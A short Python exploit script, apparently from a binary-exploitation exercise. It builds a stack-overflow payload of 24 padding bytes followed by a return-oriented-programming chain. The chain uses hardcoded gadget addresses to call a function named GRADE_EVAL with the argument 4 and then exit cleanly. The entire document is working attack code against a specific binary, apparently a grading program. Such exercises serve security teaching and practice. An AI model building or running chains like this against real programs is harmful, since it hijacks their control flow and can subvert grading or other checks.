
#!/usr/bin/env python3
import struct
import sys

OFFSET_TO_RETURN = 24

RET = 0x401636
POP_RDI_RET = 0x401a33
GRADE_EVAL = 0x401978
EXIT_PLT = 0x4016e0

payload = b"A" * OFFSET_TO_RETURN

payload += struct.pack("<Q", RET)

payload += struct.pack("<Q", POP_RDI_RET)
payload += struct.pack("<Q", 4)

payload += struct.pack("<Q", GRADE_EVAL)

payload += struct.pack("<Q", RET)
payload += struct.pack("<Q", POP_RDI_RET)
payload += struct.pack("<Q", 0)
payload += struct.pack("<Q", EXIT_PLT)

sys.stdout.buffer.write(payload)
